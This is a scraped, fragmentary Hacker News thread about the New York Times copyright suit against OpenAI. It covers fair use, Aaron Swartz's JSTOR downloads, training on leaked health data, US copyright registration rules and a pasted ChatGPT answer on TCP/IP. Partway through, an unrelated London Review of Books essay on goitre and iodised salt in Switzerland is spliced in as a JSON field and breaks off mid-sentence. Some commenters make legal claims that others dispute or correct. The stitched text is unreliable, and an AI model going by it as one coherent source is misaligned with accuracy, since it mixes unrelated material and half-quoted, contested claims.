there&#x27;s legally-murky secret data sauce, it&#x27;s firewalled from being easily seen in its entirety by anyone not golden-handcuffed to the company.They may be able to train against it.

Because the GPT-3 paper talks about \"...two internet-based books corpora (Books1 and Books2)...\" (see pages 8 and 9) - https:&#x2F;&#x2F;arxiv.org&#x2F;pdf&#x2F;2005.14165.pdfUnclear what that corpora might be, or if its the same books2 you are referring to. reply simonw 13 hours agorootparentMy guess is that this poster meant books3, not books2.books1 and books2 are OpenAI corpuses that have never (to my knowledge) had their content revealed.books3 is public, developed outside of OpenAI and we know exactly what&#x27;s in it. reply jprete 15 hours agorootparentprevWhy would he know the answer in the first place? reply Jensson 13 hours agorootparentThe legal liabilities of the training data they use in their flagship product seems to be a thing the CEO should know. reply cogman10 17 hours agorootparentprevWe all remember when Aaron Swartz got hit with a wire tapping and intent to distribute federal crime for downloading JSTR stuff right?It&#x27;s really disgusting, IMO, that corporations that go above and beyond that sort of behavior are seeing NO federal investigations for this sort of behavior. Yet a private citizen does it and it&#x27;s threats of life in prison.This isn&#x27;t new, but it speaks to a major hole in our legal system and the administration of it. The Feds are more than willing to steamroll an individual but will think twice over investigating a large corporation engaged in the same behavior. reply hibikir 16 hours agorootparentWhat happened to Aaron Swartz was terrible. I find that what he was doing was outright good. IMO the right reading isn&#x27;t to make sure anyone doing something similar faces the same way, but to make the information far more free, whether it&#x27;s a corporation using it or not. I don&#x27;t want them to steamroll everyone equally here, but to not steamroll anyone. reply verve_rat 14 hours agorootparentThere are two points at issue here. One, that information should be more free, and two, that large corporations and private individuals should be equal before the law. reply bbarnett 15 hours agorootparentprevI don&#x27;t want them to steamroll everyone equally here, but to not steamroll anyone.I think you&#x27;re nissing the point, and putting cart before horse. If you ensure that corporations are treated as stringently as people are sometimes, the reverse is true. And that means your goal will presumably be obtained, as the corporate might, becomes the little guy&#x27;s win.All with no unjust treatment. reply bbarnett 12 hours agorootparentHuh. I see downvotes. I am mystified, for if people and corporations are both treated stringently under the law, corporations will fight to have overly restrictive laws knocked down.I envision pitting corporate body against corporate body, when one corporatism lobbies, works to (for example) extend copyrights, others will work to weaken copyright.That doesn&#x27;t happen as vigilantly currently, because there is no corporate incentive. They play the old, ask for forgiveness, rather than permission angle.Anyhow. I just prefer to set my enemies against my enemies. More fun. reply Jensson 12 hours agorootparentCorporations follow these laws much more stringently than individuals. Individuals often use pirated software to make things, I&#x27;ve seen many examples of that. I&#x27;ve never seen a corporation use pirated software to make things, they pay for licenses. Maybe there is some rare cases, but pirating is mostly a thing individuals do not corporations.So in general it is already as you say, corporations are much more targeted by these laws than individuals are. These laws mostly hinders corporations, us individuals are too small to be noticed by the system in most cases.I&#x27;ve also seen indie games use copyrighted material with no issues, but AAA titles seem to avoid that like the plague. I can&#x27;t really think of many examples where corporations are breaking these laws more than small individuals do. reply froggit 9 hours agorootparent> I&#x27;ve also seen indie games use copyrighted material with no issues, but AAA titles seem to avoid that like the plague.They use copyrighted material or they commit copyright infringement? The former doesn&#x27;t necessarily constitute the latter. Likewise, given it&#x27;s an option legally, there are other factors that go into the decision to use it that likely make it less attractive to AAA games. reply bbarnett 10 hours agorootparentprevSo then you refute the comment I replied to, and its parent. replySideQuark 16 hours agorootparentprevCircumventing computer security to copy items en masse to distribute wholesale without transformation is a far cry from reading data on public facing web pages. reply cogman10 16 hours agorootparentHe didn&#x27;t circumvent computer security. He had had a right to use the MIT network and pull the JSTR information. He certainly did it in a shady way (computer in a closet) but it&#x27;s every bit as arguable that he did it that way because he didn&#x27;t want someone stealing or unplugging his laptop while it was downloading the data.He also did not distribute the information wholesale. What he planned on doing with the information was never proven.OpenAI IS distributing information they got wholesale from the internet without license to that information. Heck, they are selling the information they distribute. reply anigbrowl 14 hours agorootparentOpenAI IS distributing information they got wholesale from the internetFacts are not subject to copyright.

It was also for use on MIT computers, not for remote access (which is why he decided to install the laptop, also knowing this was against his \"right to use\").The \"right to use\" also included a warning that misuse could result in state and federal prosecutions. It was not some free for all.> and pull the JSTR informationNo, he did not have the right to pull en masse. The JSTOR access explicitly disallowed that. So he most certainly did not have the \"right\" to do that, even if he were sitting at MIT in an office not breaking into systems.> did it in a shady wayThe word you&#x27;re looking for is \"illegal.\" Breaking and entering is not simply shady - it&#x27;s illegal and against the law. B&E with intent to commit a felony (which is what he was doing) is an even more serious crime, and one of the charges.> he did it that way because he didn&#x27;t want someone stealing or unplugging his laptopAh, the old \"ends justifies break the law\" argument.Now, to be precise, MIT and JSTOR went to great lengths to stop the outflow of copying, which both saw. Schwartz returned multiple times to devise workarounds, continuing to break laws and circumvent yet more security measures. This was not some simply plug and forget laptop. He continually and persistently engaged in hacking to get around the protections both MIT and JSTOR were putting in place to stop him. He added a second computer, he used MAC spoofing, among other things. His actions started to affect all users of JSTOR at MIT. The rate of outflow caused JSTOR to suffer performance, so JSTOR disabled all of MIT access.Go read the indictment and evidence.> OpenAI IS distributing information they got wholesaleNo, that ludicrous. How many complete JSTOR papers can I pull from ChatGPT? Zero? How many complete novels? None? Short stories? Also none? Can I ask for any of a category of items and get any of them? Nope. I cannot.It&#x27;s extremely hard to even get a complete decent sized paragraph from any work, and almost certainly not one you pre-select at will (most of those anyone produces are found by running massive search runs, then post selecting any matches).Go ahead and demonstrate some wholesale distribution - pick an author and reproduce a few works, for example. I&#x27;ll wait.How many could I get from what Schwartz downloaded? Millions? Not just even as text - I could have gotten the complete author formatted layout, diagrams, everything, in perfect photo ready copy.You&#x27;re being dishonest in claiming these are the same. One can feel sad for Schwartz outcome, realize he was breaking the law, and realizing the current OpenAI copyright situation is likely unlike any previous copyright situation all at the same time. No need to equate such different things. reply cogman10 15 hours agorootparentOk, so a lot you&#x27;ve written but it comes down to this. What law did he break?Neither MIT nor JSTOR raised issue with what Schwartz did. JSTOR even went out of their way to tell the FBI they did not want him prosecuted.Remember, again, with what he was charged. Wiretapping and intent to distribute. He wasn&#x27;t charged with trespassing, breaking and entering, or anything else. Wiretapping and intent to distribute.> His actions started to affect all users of JSTOR at MIT. The rate of outflow caused JSTOR to suffer performance, so JSTOR disabled all of MIT access.And this is where you are confusing a \"crime\" with \"misuse of a system\". MIT and JSTOR were in their rights to cut access. That does not mean that what Schwartz did was illegal. Similar to how if a business owner tells you \"you need to leave now\" you aren&#x27;t committing a crime because they asked you to leave. That doesn&#x27;t happen until you are trespassed.> Go ahead and demonstrate some wholesale distribution - pick an author and reproduce a few works, for example. I&#x27;ll wait.You violate copyright by transforming. And fortunately, it&#x27;s really simple to show that chat GPT will violate and simply emit byte for byte chunks of copyrighted material.You can, for example, ask it to implement Java&#x27;s Array list and get several verbatim parts of the JDKs source code echoed back at you.> How many could I get from what Schwartz downloaded?0, because he didn&#x27;t distribute. reply SideQuark 13 hours agorootparent> What law did he break?You can read the indictment, which I already suggested you do.> Remember, again, with what he was charged. Wiretapping and intent to distribute. He wasn&#x27;t charged with trespassing, breaking and entering, or anything else. Wiretapping and intent to distribute.He wasn&#x27;t charged with wiretapping (not even sure that&#x27;s a generic crime). He was charged with (two counts of) wire fraud (18 USC 1343), a huge difference. He also had 5 different charges of computer fraud (18 USC 1030(a)(4), (b) & 2), 5 counts of unlawfully obtaining information from a protected computer (18 USC 1030 (a)(2), (b), (c)(2)(B)(iii) & 2), and 1 count of recklessly damaging a protected computer (18 USC...).He was not charged with \"intent to distribute\", and there&#x27;s not such thing as a \"wiretapping\" charge. Did you ever once read the actual indictment, or did you just make all this up from internet forum posts?If you&#x27;re going to start with the phrase \"Remember, again..\" you should try to make up nonsense. Actually read what you&#x27;re asking others to \"remember\" which you apparently never knew in the first place.> you are confusing a \"crime\" with \"misuse of a system\"Apparently you are (willfully?) ignorant of law.> You violate copyright by transforming.That&#x27;s false too. Transformative use is one defense used to not infringe copyright. Carefully read up on the topic.> ask it to implement Java&#x27;s Array list and get several verbatim parts of the JDKs source code echoed back at youProvide the prompt. Courts have ruled that code that is the naïve way to create a simple solution is not copyrighted on it&#x27;s own, so if you have only a few disconnected snippets, that violates nothing. Can you make it reproduce an entire source file, comments, legalese at the top? I doubt it. To violate copyright one needs a certain amount (determined by trials) of the content.You might also want to make sure you&#x27;re not simply reading OpenJDK.> 0, because he didn&#x27;t distribute.Please read. \"How many could I get from what Schwartz downloaded?\" does not mean he published it all before he was stopped. It means what he took.That you seem unable to tell the difference between someone copying millions of PDF to distribute as-is, and the effort one must go to to possibly get a desired copyrighted snippet, shows either dishonestly or ignorance of relevant laws. replylumost 16 hours agorootparentprevChatGPTs birth as a research preview may have been an attempt to avoid these issues.

Just because a healthcare company puts up a S3 bucket with patient health data with “robots: *” doesn’t give you a right to view or use the crawled patient data. In fact, redistributing it may land you in significant legal trouble. Something being crawlable doesn’t provide elevated rights compared to something not crawlable. reply cj 16 hours agorootparentFurthering the S3 health data thought exercise:If OpenAI got their hands on an S3 bucket from Aetna (or any major insurer) with full and complete health records on every American, due to Aetna lacking security or leaking a S3 bucket, should OpenAI or any other LLM provider be allowed to use the data in its training even if they strip out patient names before feeding it into training?The difference between this question or NYT articles is that this question asks about content we know should not be available publicly online (even though it is or was at some point in the past).I guess this really gets at “do we care about how the training data was obtained or pre-processed, or do we only care about the output (a model’s weights and numbers, etc) reply stuartjohnson12 16 hours agorootparentHIPAA is about more than just names. Just information such as a patient&#x27;s ZIP code and full medical history is often enough to de-anonymise someone. HIPAA breaches are considered much more severe than intellectual property infringements. I think the main reason that patients are considered to have ownership of even anonymised versions of their data (in terms of controlling how it is used) is that attempted anonymisation can fail, and there is always a risk of being deanonymised.If somehow it could be proven without doubt that deanonymising that data wasn&#x27;t possible (which cannot be done), then the harm probably wouldn&#x27;t be very big aside from just general data ownership concerns which are already being discussed. reply Sai_ 16 hours agorootparentprev> should [they] be allowed to use this data in training…?Unequivocally, yes.LLMs have proved themselves to be useful, at times, very useful, sometimes invaluable assistants who work in different ways than us.

They were suggesting health data with PII removed.Second, LLMs have proved that AI which gets unlimited training data can provide breakthroughs in AI capabilities. But they are not the whole universe of AIs. Some other AI tool, distinct from LLMs, which ingests en masse as much health data as it can could provide health and human longevity outcomes which could outweigh an individual&#x27;s right to privacy.If transformers can benefit from scale, why not some other, existing or yet to be found, AI technology?We should be supporting a Common Crawl for health records, digitizing old health records, and shaming&#x2F;forcing hospitals, research labs, and clinics into submitting all their data for a future AI to wade into and understand. replyadrr 16 hours agorootparentprevRobot.txt isn&#x27;t about copyrights, its about preventing bots.

Most significantly, you need to have registered the work with the Copyright Office.“No civil action for infringement of the copyright in any United States work shall be instituted until ... registration of the copyright claim has been made in accordance with this title.” 17 USC §411(a). reply jacoblambda 16 hours agorootparentBut the thing is, you can only bring the civil action forward after registering your claim but you need not register the claim before the infringement occurs.Copyright is granted to the creator upon creation. reply trogdor 12 hours agorootparentThat is incorrect.If the work is unpublished for the purposes of the Copyright Act, you do have to register (or preregister) the work prior to the infringement. 17 USC § 412(1).If the work is published, you still have to register it within the earlier of (a) three months after the first publication of the work or (b) one month after the copyright owner learns of the infringement.See below for the actual text of the law.Publication, for the purposes of the Copyright Act, generally means transferring or offering a copy of the work for sale or rental. But there are many cases where it’s not clear whether a work has or has not been published — most notably when a work is posted online and can be downloaded, but has not been explicitly offered for sale.Also, the Supreme Court recently ruled that the mere filing of an application for registration is insufficient to file suit. The Register of Copyrights has to actually grant your application. The registration process typically takes many months, though you can pay $800 for expedited processing, if you need it.~~~Here is the relevant portion of the Copyright Act:In any action under this title, other than an action brought for a violation of the rights of the author under section 106A(a), an action for infringement of the copyright of a work that has been preregistered under section 408(f) before the commencement of the infringement and that has an effective date of registration not later than the earlier of 3 months after the first publication of the work or 1 month after the copyright owner has learned of the infringement, or an action instituted under section 411(c), no award of statutory damages or of attorney’s fees, as provided by sections 504 and 505, shall be made for—(1) any infringement of copyright in an unpublished work commenced before the effective date of its registration; or(2) any infringement of copyright commenced after first publication of the work and before the effective date of its registration, unless such registration is made within three months after the first publication of the work. reply015a 17 hours agoparentprev> a more established competitorApple is already doing this: https:&#x2F;&#x2F;www.nytimes.com&#x2F;2023&#x2F;12&#x2F;22&#x2F;technology&#x2F;apple-ai-news-...Apple caught a lot of shit over the past 18 months for their lack of AI strategy; but I think two years from now they&#x27;re going to look like geniuses. reply UrineSqueegee 15 hours agorootparentdidnt they just get caught for pantent infrigment?

Initially he was in the side of OpenAI, said that model training data is fair game. After probing him, he came to the same conclusion I describe: not enforcing copyright for model training data will just result in a tightening of free access to data.We&#x27;re already seeing it from the likes of Twitter&#x2F;X and Reddit.

And the court said that the snippet production, which helps people figure out what the book is about but doesn’t substitute for the book, is a fair use.So the idea of ingesting large amounts of existing works, and then doing something new with them, I think, is reasonably well established. The question is, of course, whether we think that there’s something uniquely different about LLMs that justifies treating them differently. \"\"\"Now for my take: Proving that OpenAI trained on NYT articles is not sufficient IMO. They would need to prove that OpenAI is providing a substitutable good via verbatim copying, which I don&#x27;t think you can easily prove.

While I think OpenAI will have decent arguments for 3 of the factors, they&#x27;ll get killed on the fourth factor, \"the effect of the use on the potential market\", which is what this lawsuit is really about.If your \"fair use\" substantially negatively affects the market for the original source material, which I think is fairly clear in this case, the courts wont look favorably on that.Of course, I think this is a great test case precisely because the power of \"Internet scale\" and generative AI is fundamentally different than our previous notions about why we wanted a \"fair use exception\" in the first place. reply throwup238 16 hours agorootparentFair use is based on a flexible proportionality test so they don&#x27;t need perfect arguments on all factors.> If your \"fair use\" substantially negatively affects the market for the original source material, which I think is fairly clear in this case, the courts wont look favorably on that.I think it&#x27;s fairly clear that it doesn&#x27;t.

Courts have held in the past that the market for impact is pretty broadly defined, e.g.> For example, in one case an artist used a copyrighted photograph without permission as the basis for wood sculptures, copying all elements of the photo. The artist earned several hundred thousand dollars selling the sculptures. When the photographer sued, the artist claimed his sculptures were a fair use because the photographer would never have considered making sculptures. The court disagreed, stating that it did not matter whether the photographer had considered making sculptures; what mattered was that a potential market for sculptures of the photograph existed.

I think it&#x27;s perfectly sensible to look at gigantic corpuses of high quality literature as being something society would want to be fair use for training an LLM to better understand and produce more correct writing... but the actual information contained in NYT articles should probably be controlled primarily by NYT. If the value a business delivers (in this case the information of the articles) can be freely poached without limitation by competitors then that business can&#x27;t afford to actually invest in delivering a quality product.As a counter argument it might be reasonable to instead say that the NYT delivers \"current information\" so perhaps it&#x27;d be fair to train your model on articles so long as they aren&#x27;t too recent... but I think a lot of the information that the NYT now relies on for actual traffic is their non-temporal stuff - including things like life advice and recipes. reply tsimionescu 15 hours agorootparentThe case for copyright is exactly the opposite: the form of content (the precise way the NYT writers presented it) is protected. The ideas therein, the actual news story, is very much not protected at all.

Even if the news turns out to be entirely fake and invented by the NYT to catch you leaking their stuff, you still have every right to present the information therein.This isn&#x27;t even \"fair use\".

It dictates how data is transmitted over the network by breaking it into packets, addressing them, transmitting them, and ensuring they are received correctly.Key Components:TCP (Transmission Control Protocol): Ensures reliable delivery of data by establishing a connection and managing the transmission process, including packet sequencing and error handling. IP (Internet Protocol): Handles addressing and routing of packets, ensuring they reach the correct destination across diverse networks. Functionality:Data Handling: Data is divided into packets, which are then sent and reassembled at the destination. Error Correction & Sequencing: TCP handles errors and maintains the correct sequence of data packets, ensuring integrity in communication. Importance: TCP&#x2F;IP is critical for setting up the internet and intranet networks, allowing different types of computers to communicate effectively regardless of their architecture, operating system, or data structure.Further Reading & Sources:RFC Documents (Request for Comments):https:&#x2F;&#x2F;www.rfc-editor.org&#x2F;These are detailed documents that specify the protocols and policies of the internet, including TCP&#x2F;IP standards. They are available through the IETF RFC Pages. Internet Society:https:&#x2F;&#x2F;www.internetsociety.org&#x2F;A global, nonprofit organization dedicated to ensuring the open development, evolution, and use of the internet. It offers various publications and resources on internet protocols at Internet Society. Educational Institutions:https:&#x2F;&#x2F;ocw.mit.edu&#x2F;Many universities and technical institutes provide comprehensive notes and lectures online. Resources like MIT&#x27;s OpenCourseWare or Stanford&#x27;s Engineering Everywhere often have relevant materials on networking and protocols. By exploring these resources, you can delve deeper into how TCP&#x2F;IP works, its role in modern communications, and the technical details underlying internet networking.\"I copied the urls of the links because I dont know how to hyperlink on HN and the Stanford Engineering Everywhere link was broken.

No I am not, I am plagiarizing including plagiarizing those links.So, it has read some TCP tutorials and wrote that blurb based on those.

If one can say where the data comes from, one might have to prove that it was used only with permission.

Doing that at scale would be challenging.Wouldn&#x27;t it be better to: * Either not include copyrighted content in the training material in the first place * Explicitly tag the training material with license and origin infornation, such that the final output can produce a proof of what training material was relevant for producing that output and don&#x27;t mix differently licensed content.anigbrowl 14 hours agorootparentprevOf course not, but you can cite where specific facts or theories were first published.

At some point, you can learn, be influenced and be inspired from copyrighted material (not copyright infringement), and at some point you are just making a poor copy of the material (definitely copyright infringement). LLMs are probably still at the latter case than the former, but eventually AI will reach the former case. reply photonthug 14 hours agorootparentThere&#x27;s no obvious need to hold people &#x2F; AI to same standards here, yet, even if compression in mental-models is exactly analogous to compression in machine-models. I guess we decided already that corporations are already \"like\" persons legally, but the jury is still out on AIs. Perhaps people should be allowed more leeway to make possibly-questionable derivative works, because they have lives to live, and genuine if misguided creative urges, and bills to pay, etc. Obviously it&#x27;s quite difficult to try and answer the exact point at which synthesis & summary cross a line to become \"original content\". But it seems to me that, if anything, machines should be held to higher standard than people.Even if LLMs can&#x27;t cite their influences with current technology, that can&#x27;t be a free pass to continue things this way. Of course all data brokers resist efforts along the lines of data-lineage for themselves and they want to require it from others.

    "originBody": "Vol. 45 No. 23 · 30 November 2023 A National Evil Jonah Goodman on the curse of the goitre in Switzerland Share on Twitter Share on Facebook Email Print 4499 words A s far as the archivist knew, the 48 box files locked in an attic above the Institute for the History of Medicine at the University of Bern had never been opened. They contained a mass of handwritten letters, glass-plate negatives, annotated offprints, minutes of meetings, and piles of press clippings almost too fragile to touch. Gothic newsprint hailed victory over a ‘national evil’. ‘It sounds like a fairy tale,’ the front page of a 1922 copy of Tages-Anzeiger said. At the turn of the 20th century, the Swiss were plagued by strange, interlinked medical conditions, which existed elsewhere to a degree, but in Switzerland were endemic in more than 80 per cent of the country. It was a curse that had a mark: the goitre, a bulge of flesh protruding from the front of the neck, sometimes so large that it weighed on the windpipe, giving bearers a characteristic wheeze. It was often disguised by collars and high necklines, but its true extent is laid bare by conscription data. In 1921, nearly 30 per cent of 19-year-old Swiss conscripts had a goitre. In the cantons of Luzern and Obwalden, one in four men were exempt from military service as a result of goitres so large they struggled to breathe. For every man with a goitre, three women suffered from the condition. Children were the most vulnerable of all: in 1921, in the city of Bern, 94 per cent of schoolchildren had some swelling of the neck and almost 70 per cent had a goitre. In some parts of the country, one in ten babies was born with what was then known as cretinism. The afflicted grew little more than a metre tall, and had compressed features, thick skin, thin hair and distended bellies. Those with the disease were unable to hear or speak and were profoundly brain-damaged. In 1922, there were at least five thousand people with the condition in Switzerland. Across the country, one person in six hundred was born deaf – a rate five times the international norm. In Zurich and Bern, the most affected cantons, the rate was one in two hundred. Another malaise also affected the Swiss: brain fog – a sense of exhaustion, of hopelessness, of always being cold. The burden of these illnesses is hard to overstate. At a time when even young children were expected to help support the family, the birth of a cretin could be a catastrophe. Through it all, there was the fear of what a birth might bring; the fear that it was their fault. This was an ancient evil, noted by Vitruvius and Pliny the Elder. For tourists in the 19th century, the afflicted were one of the sights. ‘On comprend les crétins dont [pullule] la Suisse,’ Victor Hugo wrote from Bern in 1839. ‘Les Alpes font beaucoup d’idiots.’ Mark Twain, in 1880, reported the words of an English traveller: ‘I have seen the principal features of Swiss scenery – Mount Blanc and the goitre – now for home.’ Thirty-three year old woman with a large goitre. Wespi/Eggenberger collection, Institute for the History of Medicine, Univ. of Bern. Cretinism and goitre were among the great medical mysteries of 19th-century Europe. The overlap of the conditions was a source of fascination, as was their geographical specificity. Scientists, medics and armchair experts flocked to the Alps, seeming to discount nothing in their investigations: landscape, elevation, atmospheric electricity, snow melt, sunlight (too much and too little), ‘miasma’, bad beer, stagnant air, incest and ‘moral failure’. They collected information on the minutiae of life in affected areas, then cross-referenced their reports, following the contemporary medical wisdom which held that all diseases had multiple causes. Did groundwater interact with sunlight to produce goitre? Might a certain combination of air pressure and elevation create a cretin? In 1876, a list of the most promising theories was published; it featured forty different hypotheses. In 1883, the scale of the problem became evident when Dr Heinrich Bircher, a lecturer in surgery at the University of Bern, published a survey of goitre in every town and village in Switzerland. Numbers were low in the Jura mountains and in the southern canton of Ticino, but spectacularly high almost everywhere else. In Deisswill, a suburb of the capital, Bern, 94 per cent of young men had large goitres. Villages in the cantons of Zurich and Fribourg reported that one third of inhabitants were deaf. In Kaiseraugst, a short distance up the Rhine from Basel, one person in three was a cretin. Yet the clarity of the data seemed to deepen the mystery: the village of Kaisten was severely affected by the plague, but Effingen, just ten kilometres away, was not. As the new science of microbiology began to explain one disease after another, researchers competed to discover a micro-organism for goitre. There were two main theories: a water-borne pathogen and a contagious organism in or around the goitre itself. Meanwhile, theories of ‘racial hygiene’ were gaining ground, with their simple but brutal prescriptions. In Cretinous Degeneracy (1923), the Swiss doctor Ernst Finkbeiner asserted a genetic origin for the disease and offered his solution: ‘To exclude from reproduction anyone even touched by the endemic.’ Parents, siblings, distant cousins. From Rudolf Virchow to Alexander von Humboldt, Europe’s greatest scientists had tried to solve the goitre problem. Yet the solution, when it came, did not emerge from a university or research institution, or even a hospital, but from a young doctor called Heinrich Hunziker, a GP in Adliswil, a small town on the western edge of the Zurichsee. Hunziker was also a poet, who wrote short, formally precise verses of yearning and revelation that he published in slim volumes. He was 34 when, in May 1914, he stood up to speak at the Zurichsee Doctors’ Society. Everyone was looking in the wrong place, he said. The cause of the conditions was not a germ or genetic defect, but something missing. Not an agent, but an absence. T ouch your neck, just above the base. Beneath the skin, too thin to be felt, is your thyroid, a gland shaped like a butterfly, with wings spread either side of your throat. It produces two hormones that act on almost every cell in your body, influencing nearly all physiological processes: from metabolism to brain function, body temperature to growth. These hormones contain the element iodine. Your body cannot create iodine, so to produce the hormones, you must draw iodine from the world around you: mainly from food, but also from drink and the air you breathe. You only need a tiny amount – an adult requires 150 micrograms a day (fifteen hundredths of a milligram) – but without it, the consequences are dramatic. Your thyroid, desperate for iodine, begins to expand, to filter iodine more effectively from your blood. Over time, this growth becomes a goitre, but even this adaptation may not be enough. Deprived of thyroid hormones, your heart rate slows. You begin to feel cold and exhausted. Your muscles ache and become weak. Soon, your joints begin to swell, your skin dries out, your hair thins. Your voice becomes a rasp. You gain weight, and an all-consuming brain fog settles over you, making it hard to think, to remember things, to feel joy. When children are deprived of these hormones, their growth is damaged. In utero, the effects can be catastrophic. A foetus draws on its mother’s thyroid hormones to grow, and without them, its development is distorted, leading to miscarriage and birth defects, including deafness. In the first trimester of pregnancy, severe iodine deficiency in the mother will cause an embryo to miss crucial stages of development: the child will be born a cretin. Iodine can be found almost everywhere in the world. It is abundant in ocean water, and when prehistoric seas receded, the element remained on the land, where it is drawn up by plants, consumed by animals and returned to the soil. This inheritance is kept stable by an ‘iodine cycle’: what is washed out by the rain is replaced by iodine vapour blown far inland. But not in Switzerland. In the last ice age, a permanent ice sheet formed over the Alps. Up to one kilometre thick, its tremendous weight ground against the terrain. It thawed and refroze in stages, and with every thaw, meltwater washed out the rubble. Over the course of 100,000 years, this ice sheet tore the top 250 metres of rock and soil from the surface of the Swiss Central Plateau. At its peak, about 24,000 years ago, it extended across all the northern cantons. It did not reach the Jura or Ticino. In 1964, Dr Franz Merke, a Basel surgeon, showed that the extent of the ice sheet ‘corresponded precisely’ with the prevalence of goitre: Switzerland had been stripped of its iodine. This was a decade after it had finally been proved that iodine deficiency caused the linked medical conditions in the region. Forty years earlier still, in 1914, hormones had only just been defined (in 1905, by Ernest Starling at UCL), nutritional science had barely begun (with Casimir Funk’s 1912 hypothesis on vitamins), and the chemical composition of Swiss soil was unknown. Despite this, almost everything Hunziker argued turned out to be true. Iodine was discovered in 1811, and by the time Hunziker gave his speech to the Zurichsee Doctors’ Society, it was used in a bewildering variety of treatments, from cough medicines to skin creams and aphrodisiacs. ‘There was hardly any disease for which it was not recommended,’ Merke wrote in his 1971 book, History and Iconography of Endemic Goitre and Cretinism (first published in English in 1984). But in the 19th century and beyond the element had a grim reputation: it was notorious for inducing the Jod-Basedow effect, a frightening, sometimes fatal condition characterised by bulging eyes, rapid heartbeat, tremor and agitation. Iodine was both famed as a medicine and feared as a poison. Hunziker, by contrast, talked about it as a food, an essential part of everyday diet. This was a bewildering leap, and his claims about the amount required were no less startling. Treatments in Swiss pharmacies might contain a daily dose of one gram of iodine, but Hunziker argued that a ten-thousandth of this was all that was required, and that the Jod-Basedow effect (now known as iodine-induced hyperthyroidism, or IIH) was a sign of overdose. Indeed, he claimed to have tested tiny doses for years, with no ill effects: during treatment, goitre shrank; when treatment ceased, it returned. Goitre was not an alien growth or an infection, merely an enlarged thyroid. Hunziker addressed cretinism (now known as congenital iodine deficiency syndrome) with logic: in the rare instances when babies are born without a thyroid, they suffer only after birth, meaning that in utero they must use their mother’s thyroid hormones. Goitre-related birth defects – from deafness to cretinism – must therefore be due to the mother’s lack of iodine, probably in the first trimester. To end the ancestral curse, all the Swiss people needed was a tiny, daily dose of iodine delivered in an everyday commodity: table salt. Sodium chloride is the perfect vehicle for iodine. We need a small amount of sodium every day in order to function, and, like iodine, we cannot create it in our bodies. Unlike iodine, sodium is something we crave. Yet our appetite is swiftly sated: people struggle to take the correct dose of pills or tonics, but they consume a remarkably consistent amount of salt. Just as important, iodine in such minute quantities does not change salt’s taste. (Whatever chefs might claim, this fact is well established: in 1995, Unicef, concerned about the sensitivity of children to odd flavours, commissioned a study in which rice was prepared with salt iodised at ten times the maximum recommended concentration. In double-blind taste tests, the iodine was undetectable.) In 1915, Hunziker’s speech was published as a 24-page booklet. It was brief and beguilingly simple, but in Switzerland criticism was fierce. Shortly after its publication, a leading doctor at the University of Zurich, Adolf Oswald, wrote a scathing rebuttal in the country’s most authoritative medical journal demanding that the proposal ‘must be vigorously opposed’. To his detractors, Hunziker was historically illiterate and his theory a recipe for mass poisoning. That iodine had some effect on goitre was well known, but it had been thoroughly discredited as cure or prophylaxis – not just once, but numerous times. Similar ideas to Hunziker’s had been in circulation for a century. In 1820, an attempt to treat goitre with iodine by the Geneva doctor Jean-François Coindet left the physician hiding from his furious, overdosed patients. In the 1860s and 1870s, iodised salt experiments conducted in three French départements ended in disaster, with mass outbreaks of Jod-Basedow. In 1851, a remarkably similar iodine deficiency theory had been rejected by the French Académie des Sciences. Adolphe Chatin, the young director of the Paris School of Pharmacy presented exhaustive measurements of iodine concentrations in water, soil and vegetables to support his claim that the absence of minute quantities of the element gave rise to goitre. Yet his theory was dismissed: such tiny quantities of a single substance could not, he was told, have such a dramatic impact. The use of iodine as a goitre prophylaxis was proposed again in 1898, 1909 and 1912. In 1911, the US researcher David Marine announced that he had used iodine to prevent goitre in freshwater trout, though he stopped short of endorsing an iodine deficiency theory. He thought the element probably counteracted another, goitre-creating agent, much as quinine acts on the symptoms of malaria. In key respects, notably the quantities of iodine required, Hunziker’s theory really was new, but these subtleties did little to stem the opprobrium. H igh in the Alps, Otto Bayard – another country doctor, two years younger than Hunziker – was following the debate. He had studied in Dublin, been to China and Indonesia as a ship’s doctor, and after a Red Cross mission to the Balkans was now, in 1918, back in his native Valais, in a Zermatt emptied of its prewar crowds of tourists, living at the end of a railway line whose two daily steam trains only ran in the summer months. For half the year, it was all but cut off from the world, and visiting a patient could mean a twenty-hour trip on the back of a mule. Bayard was sceptical about Hunziker’s theory, but he wanted to know what worked, and knew that, for all the talk, tiny daily doses of iodine had never been put to the test. So he began to devise a new kind of experiment: in an early version of a dose-response trial, he prepared table salt iodised at five different concentrations to give to five families in a goitre area for five months. He worked alone, mixing close to 100 kg of salt with his snow shovel, turning it over until he was sure the potassium iodide was evenly spread. Then, loading up his mule, he set out for Grächen, a remote village even by the standards of upper Valais. It had no train station and no road, and sat on a thin shelf of land, one and half hours by mule from the bottom of the valley. It was badly affected by goitre; 75 per cent of the village schoolchildren had enlarged thyroid glands. Bayard took measurements and photographs, and gave the families iodised salt. He left salt for the cows, to iodise their milk, and for the bakery, so that it would be in the bread. The experiment ran through the winter, the half of the year when children went to school. When Bayard returned in spring, not only had the five families not been poisoned, they all had slimmer necks. He had given the lowest dose – just 4 milligrams of potassium iodide per kilogram of salt – to the family of Theophil Brigger, a farmer who was raising seven children, aged six to fifteen, alone. His children were transformed. Bayard broke the news of his solo endeavour just as word reached Switzerland of a successful experiment by David Marine in Akron, Ohio, in which iodine tablets were dispensed to schoolgirls (Marine’s results were published in 1917 in the US, but communication to Europe was disrupted by the war). Bayard set to work on another winter project to prove that the salt would work at scale; not for five families, but for two villages. He chose Grächen again and a village of the same size on the other side of the valley called Törbel. With funding from the Swiss Health Authority, he formalised his operation, preparing highly concentrated batches of iodised salt to be given to one trusted person from each community, along with a small set of scales and precise instructions. At their village salt depots, these representatives painstakingly portioned out three tonnes of salt, a kilogram at a time, and when Bayard returned six months later, the goitres had gone. He continued his experiments in Grächen, adjusting the dose, until, at the end of 1921, he received an invitation to present his results at the new Swiss Goitre Commission in Bern. T here were sixteen men at the first commission meeting on 21 January 1922, almost all of them senior figures in Switzerland’s top institutions: the universities, the Federal Health Authorities, the army. Although Hunziker and Bayard were only country doctors, their work was at the top of the agenda. Other possible experiments were discussed, such as intestinal disinfection against imagined goitre microbes, but Bayard’s sensational trials were the focus of attention. The attendees fiercely disagreed about the reason the salt worked, but the evidence that it did seemed irrefutable. How could it be put into practice? Bayard believed that iodised salt should be compulsory; others thought that citizens should choose for themselves whether to use it. Some advocated a clandestine programme, in which iodine would be secretly added to the salt supply, to be revealed only when its positive effects had become evident. There was another complication: in a tradition that went back to the Middle Ages, each of the 25 Swiss cantons held monopoly rights on the sale of salt within its borders. Even if iodisation were to be imposed, it could not be done at federal level: the Swiss people would have to be 